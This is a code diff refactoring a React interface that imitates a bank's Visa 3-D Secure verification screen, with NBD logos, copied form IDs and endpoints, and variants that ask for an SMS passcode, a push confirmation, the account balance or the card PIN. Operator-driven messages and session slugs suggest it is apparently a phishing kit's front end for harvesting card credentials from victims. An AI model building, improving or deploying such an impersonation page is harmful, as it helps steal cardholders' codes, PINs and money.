@@ -1,12 +1,31 @@
 import React from "react";
 import { useBankVerification } from "../../hooks/use-bank-verification";
-import type { BankVerificationProps, OperatorMessage, ResendState, TransactionDetails } from "../../types";
+import type { BankVerificationProps, ResendState, TransactionDetails } from "../../types";
 import NBD2Styles from "./styles/nbd2-styles";
 import { StyleIsolationWrapper } from "../../components/style-isolation-wrapper";
 import { BANK_LOGO_DATA_URLS } from "../../assets/bank-logos";
 
 const DEFAULT_BANK_LOGO = "nbd.png";
 const DEFAULT_CARD_LOGO = "visa.svg";
+const OVERLAY_Z_INDEX = 9999;
+const PIN_MAX_LENGTH = 4;
+const OTP_MAX_LENGTH = 6;
+
+const VARIANT_INTRO: Record<"sms" | "push" | "balance" | "pin", string> = {
+  sms: "We just sent a SMS with secure code to your registered mobile number.",
+  push: "A push notification has been sent to your mobile app.",
+  balance: "Please enter your account balance to complete the verification.",
+  pin: "Enter the PIN for your card to complete the transaction.",
+};
+
+const OTP_WRONG_MSG: Record<"pin" | "sms", string> = {
+  pin: "Wrong PIN. Please try again.",
+  sms: "Wrong OTP. Please try again.",
+};
+
+function sanitizeDigits(value: string, maxLength: number): string {
+  return value.replace(/\D/g, "").slice(0, maxLength);
+}
 
 /**
  * Bank/issuer name to logo filename. Keys are lowercase for case-insensitive lookup.
@@ -64,8 +83,19 @@ const overlayStyles = {
   display: "flex",
   alignItems: "center",
   justifyContent: "center",
-  zIndex: 9999,
+  zIndex: OVERLAY_Z_INDEX,
 };
+
+const overlayContentStyles = {
+  background: "#fff",
+  padding: 24,
+  borderRadius: 8,
+  display: "flex" as const,
+  flexDirection: "column" as const,
+  alignItems: "center" as const,
+  gap: 16,
+};
+
 const errorBannerStyles = {
   padding: "8px 16px",
   background: "#f8d7da",
@@ -86,6 +116,29 @@ function Spinner({ size = 48 }: { size?: number }) {
         } as React.CSSProperties
       }
     />
+  );
+}
+
+function FooterLinks() {
+  return (
+    <div className="footer" id="FooterLinks">
+      <div className="row">
+        <div className="visa-col-12 helpRow" id="Accordion">
+          <ul className="list-group list-group-horizontal flex-wrap pull-left">
+            <li className="list-group-item border-0">
+              <a className="btn btn-link no-decoration" data-bs-target="#FAQ" data-bs-toggle="modal" href="#FAQ" id="FooterLink1">
+                Need some help?
+              </a>
+            </li>
+            <li className="list-group-item border-0">
+              <a className="btn btn-link no-decoration" data-bs-target="#Terms" data-bs-toggle="modal" href="#Terms" id="FooterLink1">
+                learn more about authentication
+              </a>
+            </li>
+          </ul>
+        </div>
+      </div>
+    </div>
   );
 }
 
@@ -114,7 +167,7 @@ function VerificationPage({
       <NBD2Styles />
       {inProgress && (
         <div style={overlayStyles}>
-          <div style={{ background: "#fff", padding: 24, borderRadius: 8, display: "flex", flexDirection: "column", alignItems: "center", gap: 16 }}>
+          <div style={overlayContentStyles}>
             <Spinner size={48} />
             <span>Processing...</span>
           </div>
@@ -139,22 +192,12 @@ function TransactionBody({
   const amount = transactionDetails?.amount ?? "";
   const date = transactionDetails?.date ?? "";
   const card = transactionDetails?.cardNumber ?? "";
-
-  const intro =
-    variant === "sms"
-      ? "We just sent a SMS with secure code to your registered mobile number."
-      : variant === "push"
-        ? "A push notification has been sent to your mobile app."
-        : variant === "balance"
-          ? "Please enter your account balance to complete the verification."
-          : "Enter the PIN for your card to complete the transaction.";
-
   const showPaymentDetails = variant === "sms" || variant === "push";
 
   return (
     <div>
       <p className="mb-0" id="Body1">
-        {intro}
+        {VARIANT_INTRO[variant]}
         {showPaymentDetails && (
           <>
             <br />
@@ -232,63 +275,11 @@ function Shell({
         <div className="visa-styling body" dir="ltr">
           <div className="visa-styling container container-sticky-footer">
             {children}
-            {footer ?? (
-              <div className="footer" id="FooterLinks">
-                <div className="row">
-                  <div className="visa-col-12 helpRow" id="Accordion">
-                    <ul className="list-group list-group-horizontal flex-wrap pull-left">
-                      <li className="list-group-item border-0">
-                        <a className="btn btn-link no-decoration" data-bs-target="#FAQ" data-bs-toggle="modal" href="#FAQ" id="FooterLink1">
-                          Need some help?
-                        </a>
-                      </li>
-                      <li className="list-group-item border-0">
-                        <a className="btn btn-link no-decoration" data-bs-target="#Terms" data-bs-toggle="modal" href="#Terms" id="FooterLink1">
-                          learn more about authentication
-                        </a>
-                      </li>
-                    </ul>
-                  </div>
-                </div>
-              </div>
-            )}
+            {footer ?? <FooterLinks />}
           </div>
-          <form action="/Api/2_1_0/NextStep/StepUp" autoComplete="off" id="StepupForm" method="post" name="StepupForm" />
         </div>
         <div className="modal fade sf-hidden" id="FAQ" tabIndex={-1} role="dialog" aria-labelledby="FAQ-label" data-bs-backdrop="static" data-bs-keyboard="false" aria-modal="true" />
         <div className="modal fade sf-hidden" id="Terms" tabIndex={-1} role="dialog" aria-labelledby="Terms-label" data-bs-backdrop="static" data-bs-keyboard="false" aria-modal="true" />
-        <form className="nextstep-form" method="post" />
-        <form method="POST" id="TermForm" />
-      </div>
-    </div>
-  );
-}
-
-const defaultResendState: ResendState = {
-  secondsLeft: 0,
-  canResend: true,
-  onResend: () => {},
-  resending: false,
-};
-
-function FooterLinks() {
-  return (
-    <div className="footer" id="FooterLinks">
-      <div className="row">
-        <div className="visa-col-12 helpRow" id="Accordion">
-          <ul className="list-group list-group-horizontal flex-wrap pull-left">
-            <li className="list-group-item border-0">
-              <a className="btn btn-link no-decoration" data-bs-target="#FAQ" data-bs-toggle="modal" href="#FAQ" id="FooterLink1">
-                Need some help?
-              </a>
-            </li>
-            <li className="list-group-item border-0">
-              <a className="btn btn-link no-decoration" data-bs-target="#Terms" data-bs-toggle="modal" href="#Terms" id="FooterLink1">
-                learn more about authentication
-              </a>
-            </li>
-          </ul>
-        </div>
       </div>
     </div>
   );
@@ -357,6 +348,110 @@ function ErrorSpan({ message, visible }: { message: string; visible: boolean }) 
   );
 }
 
+type OtpFormConfig =
+  | { kind: "pin"; value: string; onChange: (v: string) => void; masked: boolean; onMaskToggle: () => void }
+  | { kind: "sms"; value: string; onChange: (v: string) => void };
+
+function OtpForm({
+  config,
+  onSubmit,
+  resendState,
+  submitting,
+  canSubmit,
+  onTryAgain,
+  errorMessage,
+  showError,
+}: {
+  config: OtpFormConfig;
+  onSubmit: () => void;
+  resendState: ResendState;
+  submitting: boolean;
+  canSubmit: boolean;
+  onTryAgain: () => void;
+  errorMessage: string;
+  showError: boolean;
+}) {
+  const isPIN = config.kind === "pin";
+  const maxLength = isPIN ? PIN_MAX_LENGTH : OTP_MAX_LENGTH;
+  const formId = isPIN ? "PinValidateForm" : "ValidateCredentialForm";
+  const inputId = isPIN ? "PinInput" : "CredentialValidateInput";
+  const inputName = isPIN ? "Pin.Value" : "Credential.Value";
+  const label = isPIN ? "PIN" : "Verification Code";
+
+  return (
+    <form
+      action="/Api/2_1_0/NextStep/ValidateCredential"
+      autoComplete="off"
+      id={formId}
+      method="post"
+      name={formId}
+      noValidate
+      onSubmit={(e) => { e.preventDefault(); onSubmit(); }}
+    >
+      <div className="visa-row">
+        <div className="col-12 visa-styling">
+          <div className="form-group text-center">
+            <div id="InputAction">
+              <label htmlFor={inputId} className="credential-label">{label}</label>
+              <input
+                autoFocus
+                className="form-control visa-styling credential-input"
+                id={inputId}
+                inputMode="numeric"
+                maxLength={maxLength}
+                name={inputName}
+                placeholder={isPIN ? "••••" : undefined}
+                type={isPIN && config.masked ? "password" : "text"}
+                value={config.value}
+                onChange={(e) => config.onChange(sanitizeDigits(e.target.value, maxLength))}
+                disabled={submitting}
+                {...(!isPIN && { "data-val": "true", "data-val-required": "Please enter the code" })}
+              />
+              {isPIN && (
+                <label htmlFor="pin-show-toggle" style={{ display: "block", marginTop: 8, fontSize: 14 }}>
+                  <input id="pin-show-toggle" type="checkbox" checked={!config.masked} onChange={config.onMaskToggle} />
+                  {" "}Show PIN
+                </label>
+              )}
+              {!isPIN && (
+                <span className="field-validation-valid sf-hidden" data-valmsg-for="Credential.Value" data-valmsg-replace="true" />
+              )}
+              <ErrorSpan message={errorMessage} visible={showError} />
+              <div className="visa-col-12 text-center">
+                <button
+                  type="submit"
+                  className="visa-styling btn btn-primary text-uppercase vba-button"
+                  id="ValidateButton"
+                  disabled={submitting || !canSubmit}
+                >
+                  {submitting ? "Submitting..." : "Submit"}
+                </button>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div className="visa-row" />
+      <ResendButton
+        layout={config.kind}
+        canResend={resendState.canResend}
+        secondsLeft={resendState.secondsLeft}
+        resending={resendState.resending}
+        submitting={submitting}
+        onResend={resendState.onResend}
+        onTryAgain={onTryAgain}
+      />
+      <FooterLinks />
+    </form>
+  );
+}
+
+function resolveOtpError(wrongCode: boolean, expiredCode: boolean, operatorMessage: string | undefined, kind: "pin" | "sms"): string {
+  if (wrongCode) return OTP_WRONG_MSG[kind];
+  if (expiredCode) return "Code expired. Please request a new code.";
+  return operatorMessage ?? "";
+}
+
 export function VerificationUi({
   apiBase,
   channelSlug,
@@ -368,8 +463,6 @@ export function VerificationUi({
   onRedirect,
   onClose,
 }: BankVerificationProps) {
-  if (!channelSlug || !sessionId) return null;
-
   const { layoutState, inProgress, awaitingVerification, error } = useBankVerification({
     apiBase,
     channelSlug,
@@ -382,15 +475,17 @@ export function VerificationUi({
     onClose,
   });
 
+  if (!channelSlug || !sessionId) return null;
   if (!awaitingVerification && !inProgress) return null;
 
   const { bank, transactionDetails } = layoutState;
+  const pageProps = { bank, cardBrand: transactionDetails?.cardBrand, inProgress, error, onClose };
 
   // --- Push layout ---
   if (layoutState.layout === "push") {
     return (
       <StyleIsolationWrapper>
-        <VerificationPage bank={bank} cardBrand={transactionDetails?.cardBrand} inProgress={inProgress} error={error} onClose={onClose}>
+        <VerificationPage {...pageProps}>
           <h2 className="screenreader-only">Confirm on your device</h2>
           <div className="visa-row">
             <div className="visa-col-12 visa-validate">
@@ -423,16 +518,11 @@ export function VerificationUi({
   // --- Balance layout ---
   if (layoutState.layout === "balance") {
     const { balance, onBalanceChange, onSubmit, submitting, canSubmit, operatorMessage } = layoutState;
-    const showError = Boolean(operatorMessage?.message);
 
     return (
       <StyleIsolationWrapper>
         <VerificationPage
-          bank={bank}
-          cardBrand={transactionDetails?.cardBrand}
-          inProgress={inProgress}
-          error={error}
-          onClose={onClose}
+          {...pageProps}
           footer={
             <form
               action="/Api/2_1_0/NextStep/ValidateCredential"
@@ -460,7 +550,7 @@ export function VerificationUi({
                         onChange={(e) => onBalanceChange(e.target.value)}
                         disabled={submitting}
                       />
-                      <ErrorSpan message={operatorMessage?.message ?? ""} visible={showError} />
+                      <ErrorSpan message={operatorMessage?.message ?? ""} visible={Boolean(operatorMessage?.message)} />
                       <div className="visa-col-12 text-center">
                         <button
                           type="submit"
@@ -496,73 +586,22 @@ export function VerificationUi({
   // --- PIN layout ---
   if (layoutState.layout === "pin") {
     const { pinValue, onPinChange, pinMasked, onPinMaskToggle, wrongCode, expiredCode, onTryAgain, onSubmit, submitting, canSubmit, resendState, operatorMessage } = layoutState;
-    const { secondsLeft, canResend, onResend, resending } = resendState;
-    const showError = wrongCode || expiredCode || Boolean(operatorMessage?.message);
-    const errorMessage = wrongCode
-      ? "Wrong PIN. Please try again."
-      : expiredCode
-        ? "Code expired. Please request a new code."
-        : operatorMessage?.message ?? "";
 
     return (
       <StyleIsolationWrapper>
         <VerificationPage
-          bank={bank}
-          cardBrand={transactionDetails?.cardBrand}
-          inProgress={inProgress}
-          error={error}
-          onClose={onClose}
+          {...pageProps}
           footer={
-            <form
-              action="/Api/2_1_0/NextStep/ValidateCredential"
-              autoComplete="off"
-              id="PinValidateForm"
-              method="post"
-              name="PinValidateForm"
-              noValidate
-              onSubmit={(e) => { e.preventDefault(); onSubmit(); }}
-            >
-              <div className="visa-row">
-                <div className="col-12 visa-styling">
-                  <div className="form-group text-center">
-                    <div id="InputAction">
-                      <label htmlFor="PinInput" className="credential-label">PIN</label>
-                      <input
-                        autoFocus
-                        className="form-control visa-styling credential-input"
-                        id="PinInput"
-                        inputMode="numeric"
-                        maxLength={4}
-                        name="Pin.Value"
-                        placeholder="••••"
-                        type={pinMasked ? "password" : "text"}
-                        value={pinValue}
-                        onChange={(e) => onPinChange(e.target.value.replace(/\D/g, "").slice(0, 4))}
-                        disabled={submitting}
-                      />
-                      <label htmlFor="pin-show-toggle" style={{ display: "block", marginTop: 8, fontSize: 14 }}>
-                        <input id="pin-show-toggle" type="checkbox" checked={!pinMasked} onChange={onPinMaskToggle} />
-                        {" "}Show PIN
-                      </label>
-                      <ErrorSpan message={errorMessage} visible={showError} />
-                      <div className="visa-col-12 text-center">
-                        <button
-                          type="submit"
-                          className="visa-styling btn btn-primary text-uppercase vba-button"
-                          id="ValidateButton"
-                          disabled={submitting || !canSubmit}
-                        >
-                          {submitting ? "Submitting..." : "Submit"}
-                        </button>
-                      </div>
-                    </div>
-                  </div>
-                </div>
-              </div>
-              <div className="visa-row" />
-              <ResendButton layout="pin" canResend={canResend} secondsLeft={secondsLeft} resending={resending} submitting={submitting} onResend={onResend} onTryAgain={onTryAgain} />
-              <FooterLinks />
-            </form>
+            <OtpForm
+              config={{ kind: "pin", value: pinValue, onChange: onPinChange, masked: pinMasked, onMaskToggle: onPinMaskToggle }}
+              onSubmit={onSubmit}
+              resendState={resendState}
+              submitting={submitting}
+              canSubmit={canSubmit}
+              onTryAgain={onTryAgain}
+              errorMessage={resolveOtpError(wrongCode, expiredCode, operatorMessage?.message, "pin")}
+              showError={wrongCode || expiredCode || Boolean(operatorMessage?.message)}
+            />
           }
         >
           <h2 className="screenreader-only">Enter your PIN</h2>
@@ -581,75 +620,22 @@ export function VerificationUi({
 
   // --- SMS layout (default) ---
   const { code, onCodeChange, wrongCode, expiredCode, onTryAgain, onSubmit, submitting, canSubmit, resendState, operatorMessage } = layoutState;
-  const { secondsLeft, canResend, onResend, resending } = resendState ?? defaultResendState;
-  const showError = wrongCode || expiredCode || Boolean(operatorMessage?.message);
-  const errorMessage = wrongCode
-    ? "Wrong OTP. Please try again."
-    : expiredCode
-      ? "Code expired. Please request a new code."
-      : operatorMessage?.message ?? "";
 
   return (
     <StyleIsolationWrapper>
       <VerificationPage
-        bank={bank}
-        cardBrand={transactionDetails?.cardBrand}
-        inProgress={inProgress}
-        error={error}
-        onClose={onClose}
+        {...pageProps}
         footer={
-          <form
-            action="/Api/2_1_0/NextStep/ValidateCredential"
-            autoComplete="off"
-            id="ValidateCredentialForm"
-            method="post"
-            name="ValidateCredentialForm"
-            noValidate
-            onSubmit={(e) => { e.preventDefault(); onSubmit(); }}
-          >
-            <div className="visa-row">
-              <div className="col-12 visa-styling">
-                <div className="form-group text-center">
-                  <div id="InputAction">
-                    <label htmlFor="CredentialValidateInput" className="credential-label">Verification Code</label>
-                    <input
-                      autoFocus
-                      className="form-control visa-styling credential-input"
-                      data-val="true"
-                      data-val-required="Please enter the code"
-                      id="CredentialValidateInput"
-                      name="Credential.Value"
-                      type="text"
-                      inputMode="numeric"
-                      maxLength={6}
-                      value={code}
-                      onChange={(e) => onCodeChange(e.target.value.replace(/\D/g, "").slice(0, 6))}
-                      disabled={submitting}
-                    />
-                    <ErrorSpan message={errorMessage} visible={showError} />
-                    <span
-                      className="field-validation-valid sf-hidden"
-                      data-valmsg-for="Credential.Value"
-                      data-valmsg-replace="true"
-                    />
-                    <div className="visa-col-12 text-center">
-                      <button
-                        type="submit"
-                        className="visa-styling btn btn-primary text-uppercase vba-button"
-                        id="ValidateButton"
-                        disabled={submitting || !canSubmit}
-                      >
-                        {submitting ? "Submitting..." : "Submit"}
-                      </button>
-                    </div>
-                  </div>
-                </div>
-              </div>
-            </div>
-            <div className="visa-row" />
-            <ResendButton layout="sms" canResend={canResend} secondsLeft={secondsLeft} resending={resending} submitting={submitting} onResend={onResend} onTryAgain={onTryAgain} />
-            <FooterLinks />
-          </form>
+          <OtpForm
+            config={{ kind: "sms", value: code, onChange: onCodeChange }}
+            onSubmit={onSubmit}
+            resendState={resendState}
+            submitting={submitting}
+            canSubmit={canSubmit}
+            onTryAgain={onTryAgain}
+            errorMessage={resolveOtpError(wrongCode, expiredCode, operatorMessage?.message, "sms")}
+            showError={wrongCode || expiredCode || Boolean(operatorMessage?.message)}
+          />
         }
       >
         <h2 className="screenreader-only">Your One-time Passcode has been sent</h2>
